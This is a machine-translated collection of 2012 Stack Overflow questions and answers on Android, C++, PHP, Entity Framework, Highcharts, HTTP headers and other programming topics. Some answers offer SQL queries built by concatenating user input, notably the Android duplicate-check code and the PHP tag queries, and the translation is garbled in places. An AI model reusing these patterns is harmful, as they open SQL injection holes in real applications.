fcs = (fcs >> 8) ^ crctab16[(fcs ^ *pData) & 0xff];
nLength--;
pData++;
}
return ~fcs;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:09:50.977

-fPIC 指示编译器将您的代码编译为与位置无关的代码。这是必需的，以便机器代码正确执行，而不管绝对地址如何。

这些主要用于共享库，因为可以将相同的库代码加载到每个程序地址空间中的某个位置，该位置不会与内存的其他用途等重叠。

以下链接可以提供更多信息。

维基百科：[http](http://en.wikipedia.org/wiki/Position_independent_code)
://en.wikipedia.org/wiki/Position_independent_code SO：[为什么不是所有代码编译位置独立？](https://stackoverflow.com/questions/813980/why-isnt-all-code-compiled-position-independent)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T10:59:42.323

命令行选项`-fPIC`意味着使位置独立的代码。`.so`在为 64 位编译共享对象 ( ) 时需要这样做。您无需在 32 位上使用它就可以逃脱；即使它被推荐。

# android - 在 android 应用程序中检查本地数据库时出错

> ID：11309410
> 
> 赞同：0
> 
> 时间：2012-07-03T10:53:52.847
> 
> 标签：android

我正在开发一个 android 应用程序，其中我有一个本地数据库。我希望如果用户已经输入了一个药物名称说 a。然后我再次去编辑文本并输入一个。它不应该添加到本地数据库中，怎么做这

我试图按照这个链接

[如果不存在则插入？](https://stackoverflow.com/questions/5638049/insert-if-not-exists)

谁能指导我

谢谢图沙尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:02:38.523

试试这种方式......它可以帮助你。

```
String sql = "select * from "
                + TABLE_NAME + " WHERE placeId = '" + placeId + "'"; 
        Cursor cursorinfo = null; 
        try {
            database = databaseHelper.getReadableDatabase();
            cursorinfo = database.rawQuery(sql, null);
        } catch (Exception ex) {
            ex.printStackTrace();
        }

if (cursorinfo.moveToFirst()) {
            try {
                ///Already Exist data..
            } finally {
                database.close();
                cursorinfo.close();
            }

        } else {
            database = databaseHelper.getWritableDatabase();
            try {
                database.insert(TABLE_NAME, "", values);
            } finally {
                database.close();
                cursorinfo.close();
            }
        } 
```

谢谢..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:21:35.767

您只需要检查您`Record`是否已经在表中，并且您已经遵循正确的答案，我不知道您为什么不能这样做，这就是您所要做的。

```
Cursor cursor = database.query(tableName, null, "mediName="+editTextValue, null, null, null, null); 
boolean exists = (cursor.getCount() > 0); 
cursor.close(); 

if(!exists)
{
    database.insert(DATABASE_TABLE, null, updateValues); 
}
else
{
    // Record Already there.
} 
```

# css - 在 xul 中访问 treechildren 以进行样式设置

> ID：11309411
> 
> 赞同：1
> 
> 时间：2012-07-03T10:53:59.777
> 
> 标签：css, firefox-addon, xul

我在 xul 中有这段代码：

```
<treechildren id = "mainTree_treechildren">
    <treeitem container="true" open="true">
        <treerow>
           <treecell label="&tree.actions;" />
        </treerow>
        <treechildren id="tree_actions_treechildren" >
            <treeitem container="true" open="true">
                <treerow>
                     <treecell label="&tree.actions.warnings;" />
                </treerow>
            </treeitem>
        </treechildren>
     </treeitem>
</treechildren> 
```

我有问题造型它。我需要为 treecell in 使用`mainTree_treechildren`不同的文本颜色，在他的子 treechildren 中为 treecell 使用不同的文本颜色 id `tree_actions_treechildren`。

目前我有这个CSS代码

```
#mainTree #mainTree_treechildren::-moz-tree-cell-text { color: #000000; }
#mainTree #tree_actions_treechildren::-moz-tree-cell-text { color: #FFFFFF; } 
```

但它不起作用。我只为里面的每个元素获得黑色， `mainTree_treechildren`包括`tree_actions_treechildren`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T12:22:39.870

这些`<treechildren>`元素实际上并没有被显示——它们只是树小部件的数据源（其他数据源也是可能的，例如 RDF 或 XML 文件）。因此，它们的内容不能直接设置样式。如果您想以不同的方式设置单个树单元格的样式，您应该使用[`properties`属性](https://developer.mozilla.org/en/XUL/treecell#a-properties)。像这样的东西应该工作：

```
<treechildren id="mainTree_treechildren">
    <treeitem container="true" open="true">
        <treerow>
           <treecell label="&tree.actions;" />
        </treerow>
        <treeitem container="true" open="true">
            <treerow>
                <treecell label="&tree.actions.warnings;" properties="warning" />
            </treerow>
        </treeitem>
     </treeitem>
</treechildren> 
```

以及对应的样式：

```
#mainTree_treechildren::-moz-tree-cell-text { color: #000000; }
#mainTree_treechildren::-moz-tree-cell-text(warning) { color: #FF0000; } 
```

请注意，`#foo #bar`不建议使用 CSS 选择器 - ID 始终是唯一的，因此在选择器中指定多个只会减慢速度。

# android - Android 移除 videoview 弹出消息

> ID：11309412
> 
> 赞同：1
> 
> 时间：2012-07-03T10:54:01.867
> 
> 标签：android, popup, android-videoview

我想从我的应用程序的视频视图中删除弹出消息“抱歉此视频无法播放”。我不希望我的应用显示任何错误消息。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-03T11:05:31.997

设置`ErrorListener`为您的`VideoView`and`return true`从那里开始，现在不会显示错误。

**IE：**

```
yourVideoView.setOnErrorListener(new OnErrorListener() {
  public boolean onError(MediaPlayer mp, int what, int extra) {
     return true;
  }
}); 
```

# c++ - std::vector错误 C2582: 'operator =' 函数在

> ID：11309416
> 
> 赞同：3
> 
> 时间：2012-07-03T10:54:16.390
> 
> 标签：c++, stdvector

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-07-03T11:03:23.270

向量的元素必须是：

*   可复制，即具有与`T(const T&)`.
*   可分配，即与`operator=`兼容`operator=(const T&)`。
*   默认可构造，即具有与`T()`.

虽然错误表明违反了可分配的要求，但代码表明并非如此。每个类都有一个编译器生成的复制构造函数和赋值运算符，除非它们是手动定义的，所以你的类实际上应该是可赋值的。但是，只有在没有定义其他构造函数时才会隐式生成默认构造函数。您有一个构造函数，因此还必须定义一个默认构造函数。

正如 Mike 所指出的，要求减少到只能在 C++11 中移动，但您需要一个已经支持相应 C++11 功能的编译器，并且必须启用这些功能。但是，错误中的路径表示 Visual Studio 9.0，也就是 Visual Studio 2008，它早于 C++11，因此限制适用。

* * *

默认情况下，可复制和可分配是满足的，除非你破坏了它们。规范说，

*   在 12.8.4 中：

    > 如果类定义没有显式声明复制构造函数，则隐式声明。

*   在 12.8.10 中：

    > 如果类定义没有显式声明复制赋值运算符，则隐式声明一个。

在这两种情况下，仅当所有基类和所有成员都具有可访问且明确的对应复制构造函数和复制赋值运算符时才定义。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-03T11:05:51.570

您发布的代码没有任何问题。听起来您的真实类（或基类）声明了一个非公共赋值运算符。这意味着该类是不可分配的，因此对于如何在标准容器中使用它存在限制。如果它不可复制，您也会遇到问题 - 也就是说，如果声明了非公共复制构造函数。

在 C++03 中，根本无法使用。您需要使其可复制构造和可分配以在任何标准容器中使用它。

`vector`在 C++11 中，只要它是可移动的，它就可以存储在 a中。`push_back`如果它也是不可复制的，则可能无法正常工作，在这种情况下，您可以使用`emplace_back(1,2,3)`or `push_back(std::move(a))`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:02:05.683

您需要将 operator= 和复制构造函数添加到 A 类

```
class A 
{
    public:
    A(int a,int b,int c);
    A(const A& element);
    A& operator=(const A& element);     //which needs definition
}; 
```

# php - 使用 sql 查询获取所有标签

> ID：11309417
> 
> 赞同：0
> 
> 时间：2012-07-03T10:54:18.293
> 
> 标签：php, sql

我有这个由其他人帮助制作的sql。

```
$sql ="
select e.*, i.*, group_concat( t.tag separator ',') as tag_list
from nv_entries e
JOIN nv_tags t on t.entrie_id = e.id
LEFT JOIN nv_images i on i.entrie_id = e.id

where t.tag in ( $tag_list )
group  by e.id
having count(t.id) = $num_tags "; 
```

结果是这样的（我在这里只显示一个条目，可能更多）：

```
[1] => Array
        (
            [id] => 2
            [band] => Kids for Cash
            [album] => No More Walls E.P.
            [label] => 
            [year] => 1986
            [text] => Text about album kids for cash.
            [entrie_id] => 2
            [source] => img02_9lch1.png
            [tag_list] => tree
        ) 
```

对于标签，我必须显示条目具有的所有标签并突出显示用于获取结果的标签。在这种情况下`[tag_list] => tree`，只显示一个标签，即在搜索字段中使用的标签。我的问题是，我怎样才能得到这样的结果？：

```
 ...
            [tag_list] => tree, green, foo, bar
            [used_tags] => tree
        ) 
```

作为一个数组也很好，但是当它只是一个项目时也请一个数组。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:19:44.970

如果我理解正确，在有条件下使用 >=

```
$sql ="
select e.*, i.*, group_concat( t.tag separator ',') as tag_list
from nv_entries e
LEFT JOIN nv_images i on i.entrie_id = e.id
JOIN nv_tags t on t.entrie_id = e.id

where t.tag in ( $tag_list )
group  by e.id
having count(t.id) >= $num_tags "; 
```

添加

子查询方法：

```
$sql ="
select e.*, i.*, group_concat( t.tag separator ',') as tag_list
from nv_entries e
JOIN nv_tags t on t.entrie_id in (
select se.id 
from nv_entries se
JOIN nv_tags st on st.entrie_id = se.id

where st.tag in ( $tag_list )

group  by se.id
having count(st.id) >= $num_tags

)
    LEFT JOIN nv_images i on i.entrie_id = e.id
    WHERE 1
    group by e.id
 "; 
```

进入子查询，我得到条目的 ID 列表，至少有请求的标签，然后在主查询中我得到所有 infox

添加固定查询（见提问者评论）

子查询方法，修复“e”和“t”之间丢失的连接：

```
$sql ="
select e.*, i.*, group_concat( t.tag separator ',') as tag_list
from nv_entries e
JOIN nv_tags t on t.entrie_id = e.id 
    LEFT JOIN nv_images i on i.entrie_id = e.id
    WHERE e.id in  (
select se.id 
from nv_entries se
JOIN nv_tags st on st.entrie_id = se.id

where st.tag in ( $tag_list )

group  by se.id
having count(st.id) >= $num_tags

)
    group by e.id
 "; 
```

# castle-windsor - 温莎 WCF 设施和类型工厂

> ID：11309418
> 
> 赞同：0
> 
> 时间：2012-07-03T10:54:22.480
> 
> 标签：castle-windsor, wcffacility, typed-factory-facility

我的问题与温莎提供的 WCF 和类型化工厂设施有关。我对 IoC 容器概念，尤其是设施非常陌生，但在评估了我们不久前写的一个项目后开始研究它。该程序是 n 层的并且不是非常可单元测试的，因为依赖注入并不是到处都实现的。问题在于，由于它是 n 层的，因此进行适当的 DI 最终会使顶层负责创建一个实例，该实例将被使用 5 层以下；所以我转向国际奥委会。

但是，在阅读了许多 SO 文章和其他网站之后，我现在遇到了几个问题。最初的主要问题之一是将类与 WCF 服务的物理实现分离，我这样做如下：

```
service = ManagerService.IoC.Resolve<IGridSubmitWorkService>(new { binding = new BasicHttpBinding(), remoteAddress = new EndpointAddress(WorkerAddress) });

result = service.SubmitWorkUnit(out errorString, aWorkUnit);
ManagerService.IoC.Release(service); 
```

但是，我发现多次提到您不应该使用`IoC.Resolve<>()`，而应该使用工厂和 WCF 设施来消除对您的依赖，`IoC container`并且它是一种服务定位器模式，有些人认为它是一种反模式。

我的问题是：上面的三行代码几乎解决了我所有的问题，但是为了遵循正确的模式，我必须创建一个 WCF 工具，一个类型化工厂（它将处理为我提供使用此代码的类的实例) 和工厂的新界面，这感觉*就像*是为了取悦模式而过度设计并在代码中添加不必要的复杂性。

**问题1：**我在这里缺少一些基本的东西吗？

**问题 2：**从代码中可以看出，我正在为 Web 服务调用一个非空的构造函数。如果我实现 WCF 设施，这仍然会那么简单吗？

**问题 3：**由于我发现 Windsor wiki 上的解释非常简短而且没有真正用处，您能否指出一个关于使用 WCF 设施的体面教程？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T22:12:07.067

**Q1。**是的，我认为有一些重要的事情被遗漏了。在您的三行示例中，您所做的只是将一个实现依赖项（您的 GridSubmitWorkService）替换为另一个（ManagerService.IoC）。为了说明，为什么不使用以下内容使其更简单？

```
service = new GridSubmitWorkService(binding,remoteAddress);
result = service.SubmitWorkUnit(); 
```

这又更简单了，但它具有硬连线的实现依赖性。关键是构造函数和属性注入允许您编写干净的组件，而不必了解管道是如何完成的。在您的代码和我的代码中，都违反了该原则-组件正在管理自己的管道，并且在大型应用程序中，这变得非常痛苦，非常快。这就是为什么许多人认为 ServiceLocator 是一种反模式的原因。

您的服务定位器的名称本身就让游戏失去了意义。**它被称为 IoC -控制反转的**缩写。但是，当您查看这两位代码的结构时，您可以清楚地看到没有任何内容被**反转**- 代码在两种情况下都在做几乎相同的事情，但您的示例只是更抽象和复杂一点。

也没有人提供 IoC 试图强迫你坚持一种模式。如果您没有看到好处，或者您的应用程序根本没有好处，那么请不要使用该模式。

**Q2。**任何体面的 DI 容器都基于构造函数注入。使用 Windsor WCF 工具非常简单，它支持多种托管方法，因此绑定和地址之类的事情无论如何都可以正确处理。

**Q3。**除了 Windsor 文档和 wiki 之外，stackoverflow.com 上还有大量信息，从论坛到问题。如果有您无法解决的问题，我建议提出一个具体问题。

# jquery - 如何使用 jquery 将 td 元素修改为 JSP 中的超链接

> ID：11309421
> 
> 赞同：1
> 
> 时间：2012-07-03T10:54:27.577
> 
> 标签：jquery, jsp

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:07:48.423

尝试这个

```
for(int i=0;i<result.size();i++)
    {
        %><tr><td><input class="tablechkbox" type="radio" name="prodAlertsRad"/></td><%

        List r=new ArrayList();
        r=(List)result.get(i);
        for(int j=0;j<r.size();j++)
        {
            if(j==r.size()-1){%>
        <td class="viewa"><a href="<%out.print(r.get(j));%>"><%out.print(r.get(j));%></a>
    <%}else{
            %><td class="viewa"><%out.print(r.get(j));%></td><%}
        }
        %></tr><%
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:03:17.087

您需要在这部分代码中进行更改。

```
for(int j=0;j<r.size();j++) 
{
   %><td class="viewa"><%out.print(r.get(j));%></td><%             
} 
```

要使您的 url 用作超链接，您需要在 ur 中使用锚标记`td`。`url`此外，了解您在 list 中的确切索引也很重要`r`。由于在您的情况下， url 在最后一个索引处，我们可以这样修改代码-

```
for(int j=0;j<r.size()-1;j++) //changed to size-1
{
   %><td class="viewa"><%out.print(r.get(j));%></td><%             
}
 %><td class="viewa"><a href="<%out.print(r.get(r.size()-1));%>"><%out.print(r.get(r.size()-1));%></a></td><% 
```

您可能需要做很少的处理来避免`indexOutOfBoundException`. 我把它留给你去做:)

# c# - 为什么 EntityCollection.Remove() 会导致 SaveChanges() 引发 InvalidOperationException？

> ID：11309423
> 
> 赞同：4
> 
> 时间：2012-07-03T10:54:39.853
> 
> 标签：c#, entity-framework, sqlite

使用以下数据库模式：

```
CREATE TABLE master (
    id integer primary key autoincrement, 
    title text);
CREATE TABLE slave (
    id integer primary key autoincrement, 
    master_id integer not null, 
    title text, 
    foreign key (master_id) references master (id)); 
```

我创建了一个 sqlite 数据库，然后我用它来创建一个实体框架 .edmx 文件。

然后我添加了一个主记录和一个从记录，它工作正常，然后我尝试删除从记录，但这引发了一个异常，我不知道为什么。

```
var ctx = new blaEntities();
var newMaster = master.Createmaster(0);
ctx.masters.AddObject(newMaster);

var newSlave = slave.Createslave(0, 0);
newMaster.slaves.Add(newSlave);

ctx.SaveChanges(); // works fine, both id and master_id properties of newMaster 
                   // and newSlave are then set with generated values.

newMaster.slaves.Remove(newSlave);

ctx.SaveChanges(); // InvalidOperationException is raised 
```

异常的消息是：

> 操作失败：无法更改关系，因为一个或多个外键属性不可为空。当对关系进行更改时，相关的外键属性将设置为空值。如果外键不支持空值，则必须定义新的关系，必须为外键属性分配另一个非空值，或者必须删除不相关的对象。

我究竟做错了什么？

**编辑**：

这是由EF`Createslave(...)`方法生成的：

```
public static slave Createslave(global::System.Int64 id, global::System.Int64 master_id)
{
    slave slave = new slave();
    slave.id = id;
    slave.master_id = master_id;
    return slave;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:00:06.483

您的奴隶仍然存在，他的 FK 列 master_id 需要一个值。如果要完全删除它，则需要告诉 EF 将其删除，而不是将其从其父级中删除。如果您不想删除它，请分配一个新的 master_id 或将此列设置为可为空。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:00:18.387

从表中仍有一个从属对象，该对象在 masterId 列中未设置任何值。

尝试使用`ctx.DeleteObject(newSlave)`摆脱它。

# javascript - 如何在特定位置绘制 SVG 形状（取决于 xAxis）

> ID：11309429
> 
> 赞同：3
> 
> 时间：2012-07-03T10:55:12.177
> 
> 标签：javascript, svg, highcharts, highstock

我在 Highcharts 中有一个图表（更具体地说：它是一个 Highstocks 图表，烛台类型），现在我想向它添加一些 SVG 形状。

我知道有这个渲染器对象，但它只接受相对于画布的 x 和 y 坐标。

我需要的是在特定时间（xAxis）添加一些形状，所以我需要它接受 x/y 值作为图表坐标（不是画布坐标）（我显然怀疑这是可能的）或者我们需要得到图表内特定点的 x/y 画布位置。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T13:52:42.173

您可以通过以下方式扩展现有符号

```
$.extend(Highcharts.Renderer.prototype.symbols, {
    newSymbol: function() {
        return [//SVG path as Array];
    }
}); 
```

[这是一个小提琴](http://jsfiddle.net/hfrntt/zAxPQ/10/)证明

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T14:11:33.957

要绘制 SVG 形状并通过缩放移动它，我使用了两种方法，第一种只是把它当作一个想法，看看你是否能比我做得更好，第二种方法总是有效的

*第一种方式*

获取此形状的 x 坐标：如您所知，highstock 使用 unix 时间，所以假设您想在 X 数据 = 1326844540000 处添加您的形状，现在根据 series[i] 获取 1326844540000 的 x 位置我会假设您有一个系列，所以使用 series[0] ，这是你如何获得 x-coor ：

```
 $.each(chart.series[0].points, function(index,value){
                         if(value.category == 1326847170000 ) 
                         console.log(this.plotX) ;
                 }); 
```

现在`.append()`用来添加你的 SVG ：

```
 var myrect = $(".highcharts-series-group") ; 
    $(myrect).append(<your svg goes here with 
            x ="you have it from the previous code " y="") 
```

此代码将进入 (xAxis - events - setExtremes) 并且还会加载

*推荐的方式*

`attr()`推荐和保证的方法是创建一个标志，给它一个 id，然后你可以通过编辑这个标志来做你想做的任何事情

**更新**

*   如果您在缩放时默认为图表添加一个标志，则转换时您不必担心每次 rangeselector 或缩放更改时都会移动您的元素。
*   如果你给你的标志 id 它将很容易使用 jquery 选择
*   看到这个： ![在此处输入图像描述](../Images/218d39993dc1e0ee4984ce70f475cc07.png)
*   突出显示的标签中的第四条路径`<g>`是您将编辑的内容以绘制您想要的任何内容

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T12:55:03.390

您可以使用图形来替换某个数据点。下面的[**示例**](http://jsfiddle.net/dPqg7/8/)演示了这种能力。在下面的示例中，特定点被图形替换。它恰好是需要绘制图表的最高点。

```
data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, {
  y: 26.5,
  marker: {symbol: 'url(http://www.highcharts.com/demo/gfx/sun.png)'}
}, 23.3, 18.3, 13.9, 9.6] 
```

# ruby-on-rails - 如何单击图形并将其保存在 ruby on rails 的数据库中

> ID：11309431
> 
> 赞同：0
> 
> 时间：2012-07-03T10:55:20.757
> 
> 标签：ruby-on-rails, ruby, image, forms, click

我目前正在数字化医生的表格，他们可以在其中输入一些患者数据。“基础”（复选框、单选按钮等）很容易创建。我为此使用了formtastic。

但现在真正的问题是：医生必须在一个圆圈中标记一个区域（这是为乳腺癌患者准备的），即肿瘤所在的位置。在纸面上，这显然不是问题。

是否可以对 ruby​​ on rails 做同样的事情？用户必须标记并保存“标记的圆圈”。如果用户可以在保存之后或之前编辑（删除标记和/或添加另一个标记）圆圈，那将是很棒的。

我创建了一个小例子：

[http://i49.tinypic.com/2v2wemu.jpg](http://i49.tinypic.com/2v2wemu.jpg)

（不能在我的帖子中包含图片，因为我是新用户，希望这仍然有效）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:19:12.040

我认为这更像是一个javascript问题。

您将使用图像，对您来说重要的是图像元素本身、它的分辨率以及如何在用户单击它时捕获光标位置。

从类似的东西开始

```
$('img').click() 
```

之后

jQuery[偏移量](http://api.jquery.com/offset/)

# java - swt新窗口中的不确定进度条

> ID：11309434
> 
> 赞同：0
> 
> 时间：2012-07-03T10:55:31.053
> 
> 标签：java, progress-bar, swt, windowbuilder

我正在使用窗口构建器设计 java 应用程序的界面。我需要做的是.. 单击一个按钮会做两件事 1\. 执行一些后台任务 2\. 在此过程中，在新窗口中显示一个不确定的进度条。我知道我需要多线程来完成这个。

我尝试了一些教程的帮助，但无法实现。

任何人都可以帮忙吗？

代码：我要打开进度条窗口的函数

```
public void mouseDown(MouseEvent e) {
pbar p=new pbar();
p.caller();
dowork(); 
```

p.closeprogress();

```
} 
```

进度条类

```
import org.eclipse.swt.widgets.Display;

public class pbar {

protected Shell shell;

public void pcaller() {
    try {
    //System.err.println("Error: " + bod);

//System.err.println("Error: " + lines);
        pbar window = new pbar();
        window.open();
    } catch (Exception e) {
        e.printStackTrace();
    }
}

/**
 * Open the window.
 */
public void open() {
    Display display = Display.getDefault();
    createContents();
    shell.open();
    shell.layout();
    while (!shell.isDisposed()) {
        if (!display.readAndDispatch()) {
            display.sleep();
        }
    }
}

/**
 * Create contents of the window.
 */
protected void createContents() {
    shell = new Shell();
    shell.setSize(315, 131);
    shell.setText("Updating!!! Please Wait");

    ProgressBar progressBar = new ProgressBar(shell, SWT.INDETERMINATE);
    progressBar.setBounds(47, 34, 195, 17);
//  ProgressBar pb2 = new ProgressBar(shell, SWT.HORIZONTAL | 

SWT.INDETERMINATE);
   // pb2.setLayoutData(new GridData(GridData.FILL_HORIZONTAL));
}

public void close()
{
    shell.close();
}
} 
```

我想当我调用 p.caller() 时，会出现进度条。然后，控制权应该来到原始程序并执行 dowork() 方法。当我完成这个方法时，它会调用 p.progress.close()。我不知道为什么不理解这个简单的程序，忘记回答。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:32:30.787

可以接受使用 JFace 吗？如果是这样，您可以使用 ProgressMonitorDialog 类。

```
ProgressMonitorDialog dialog = new ProgressMonitorDialog(parent.getShell());
dialog.run(true, true, new SomeTask());

...

class SomeTask implements IRunnableWithProgress {

    @Override
    public void run(IProgressMonitor monitor) throws InvocationTargetException,
            InterruptedException {
        monitor.beginTask("Doing some task", IProgressMonitor.UNKNOWN);
        for(int i = 0; i < 1000; i++) {
            if (!monitor.isCanceled())
                Thread.sleep(10);
        }

        monitor.done();
    }
} 
```

您可以在此处找到完整[的使用示例。](http://www.java2s.com/Code/Java/SWT-JFace-Eclipse/JFacesProgressMonitorDialog.htm)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T12:02:34.187

尝试使用......

```
JProgressBar p = new JProgressBar();
p.setStringPainted(); 
```

现在需要设置值。

```
 p.setValue(val); 
```

完成后显示一条消息。

```
p.setString("done"); 
```

# windows-phone-7 - 在 windows phone 7.5 中使用拖动事件在网格中切换矩形

> ID：11309442
> 
> 赞同：0
> 
> 时间：2012-07-03T10:55:43.307
> 
> 标签：windows-phone-7

我的 Windows Phone 益智游戏有点吃力。

我想在同一个网格上的两个辅助矩形之间进行切换。

点击事件很容易实现，但实现拖动似乎是一个很大的痛苦。

我还使用自定义用户控件来获取网格上的矩形，因此我需要在将事件附加到我的矩形矩阵之前创建自定义委托。

我目前正在使用操作完成和操作开始事件来实现拖动手势，但是有几个问题：

1）我必须区分点击和实际拖动之间的区别，两者都包含在操作完成事件中。这是我现在做的方式：

```
if (e.TotalManipulation.Translation.X == 0 && e.TotalManipulation.Translation.Y == 0)
        {

        }
        else
        {do drag stuff here} 
```

但是，do drag stuff here 部分似乎不起作用，即使转换不同于 0；它总是执行点击事件。

我目前正在使用操作事件，因为正如我所说，我正在使用自定义控件作为我的矩形矩阵的对象原型，并且我需要自定义委托，显然，GestureListener 没有其事件类的构造函数.

那么，关于如何做到这一点的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-04T07:59:41.737

在发布这个问题后，我想出了答案。

您实际上可以将手势侦听器附加到自定义控件并创建自定义委托，方法是将手势侦听器拖动事件中的拖动手势事件参数发送到您创建的委托并且它可以工作。

# java - 如何检查java中字符串中存在的坏字符

> ID：11309443
> 
> 赞同：0
> 
> 时间：2012-07-03T10:55:43.917
> 
> 标签：java

我有一个字符串，我需要一个实用程序方法来查找字符串中存在的坏字符并返回一些标志。提前感谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:00:28.617

目前尚不清楚您要从问题中做什么，但您可能只使用[String.indexOf(...)](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#indexOf%28int%29)来检测“坏字符”的存在

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:01:40.190

使用正则表达式来定义您希望在字符串中出现的字符。如果出现其他情况，请以某种方式报告。

简单的例子：

```
String s = "humbapumpa jim";
if (!s.matches("[a-zA-Z]+")) return false; 
```

或者从另一边：定义你的“坏”角色，如果它们出现就会发出警报。

```
String s = "humbapumpa jim";
if (s.matches("[a]+")) return false; 
```

有关 Java 正则表达式的更多信息：[http ://www.vogella.com/articles/JavaRegularExpressions/article.html](http://www.vogella.com/articles/JavaRegularExpressions/article.html)

# http - Location 标头可以用于 201 Created 响应中的多个资源位置吗？

> ID：11309444
> 
> 赞同：13
> 
> 时间：2012-07-03T10:55:50.240
> 
> 标签：http, rest

接受批量 PUT 创建然后返回多个位置的正确动词和响应是什么？Location 标头似乎只支持一个 Uri。

我最初假设我可以使用 PUT 进行批量创建并返回一个带有 Uris 列表的字符串数组，但在查看[规范](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.30)时，似乎不支持，但也不完全清楚。

是否允许使用多个 Location 标头作为替代方案？

有什么建议吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-03T11:48:10.977

不，您只能有一个 Location 标头字段（是的，从规范中可以清楚地看到）。

话虽如此，PUT 用于创建/更新单个资源。看来您正在将它用于它不是为它设计的东西......

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-06-19T11:06:13.703

PUT 只能创建一个资源，因为按照规范：

> PUT 方法请求创建目标资源的状态或将其替换为请求消息有效负载中包含的表示定义的状态。

（[https://www.rfc-editor.org/rfc/rfc7231#section-4.3.4](https://www.rfc-editor.org/rfc/rfc7231#section-4.3.4)）

但是，具有不同动词（例如 POST）的请求可能会创建多个资源并返回 201 Created 状态。根据规范：

> 请求创建的主要资源由响应中的 Location 头字段标识，如果没有收到 Location 字段，则由有效的请求 URI 标识。201 响应负载通常描述并链接到创建的资源。

（[https://www.rfc-editor.org/rfc/rfc7231#section-6.3.2](https://www.rfc-editor.org/rfc/rfc7231#section-6.3.2)）

因此，可以在 201 响应中返回多个已创建资源的 URI，例如 POST 请求，但 Location 标头可能只包含一个 URI。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-22T04:16:53.477

[RFC 5988](https://www.rfc-editor.org/rfc/rfc5988)引入了链接 HTTP 标头。它可以用于此目的。

# solr - 基于 SOLR 统计的最佳结果

> ID：11309447
> 
> 赞同：2
> 
> 时间：2012-07-03T10:56:06.367
> 
> 标签：solr, grouping, faceted-search

我正在使用 SOLR 3.6。我有用户列表以及他们从 Internet 下载的数据（以字节为单位）。我已经在上面应用了方面。现在我希望根据用户对字节的最高下载量来显示结果。

我在该分数字段中通过结果组（FieldCollapsing）进行了研究。但它对我没有用..因为我希望用户名也应该被分组。我使用了以下查询：但它没有用

```
http://localhost:8085/solr/select?q=iap:1&stats=true&stats.field=recv_bytes&stats.twopass=true&rows=0&indent=true&stats.facet=user_name&stats.sort=count(recv_byets) 
```

首先，我正在使用这个..这给了我分组的结果。但不是统计数据..所以我使用了上面的查询..

```
http://localhost:8085/solr/select?wt=json&indent=true&fl=id,category,log_component,user_name,w_date&q=iap:1&group=true&group.field=user_name 
```

对于 SQL 数据库，我的查询将像这样形成..

```
select USERNAME,SUM(RECV_BYTES) as BYTES from WEB_USER_5MIN where "5mintime" >=timestamp '2012-07-02 00:00:00' and "5mintime" <= timestamp '2012-07-02 23:59:59' and APPID in ('64.11.122.0cyberoam') group by username order by bytes desc 
```

所以主要是为了 ORDER BYTES DESC 我希望适当的 solr 工作..

# c# - 在 asp.net 页面中播放视频

> ID：11309450
> 
> 赞同：0
> 
> 时间：2012-07-03T10:56:19.697
> 
> 标签：c#, asp.net

我正在尝试从数据库中的视频路径播放视频。如果我用以下方法对值进行硬编码，那么我可以播放视频。但是我不确定如何直接从数据库中动态播放它。

```
 <object id="Object1" classid="clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6">
                               <param name="url" value="C:\Users\3embed\Documents\Visual Studio 2010\Projects\HeritageWeb\HeritageWeb\Videos\tum-ho.mp4" / >
                        <param name="http://" />
                        <param name="AutoStart" value="1" />
                        <param name="ShowControls" value="1" />
                        <param name="ShowStatusBar" value="1" />
                        <param name="ShowDisplay" value="1" />
                        <param name="stretchToFit" value="1" />
                        <embed autostart="0" filename="" height="379" 
                            pluginspage="http://www.microsoft.com/Windows/Downloads/Contents/MediaPlayer/" 
                            showcontrols="1" showdisplay="1" showstatusbar="1" 
                            src="C:\Users\3embed\Documents\Visual Studio 2010\Projects\HeritageWeb\HeritageWeb\Videos\tum-ho.mp4" type="application/x-mplayer2" width="424"></embed>

</embed> 
```

我们如何修改“”从数据库中获取值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:00:50.253

最好是从 yr 对象中创建一个控件并添加一个属性，您可以提供电影的路径/url

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:14:16.320

`<embed>`对您的对象进行这些更改添加`runat="server"`以使其可用于代码隐藏并为其提供`ID="Video"`. 现在您可以根据需要更改其属性。

```
<embed autostart="0" filename="" height="379" runat="server" ID="Video"
                                pluginspage="http://www.microsoft.com/Windows/Downloads/Contents/MediaPlayer/" 
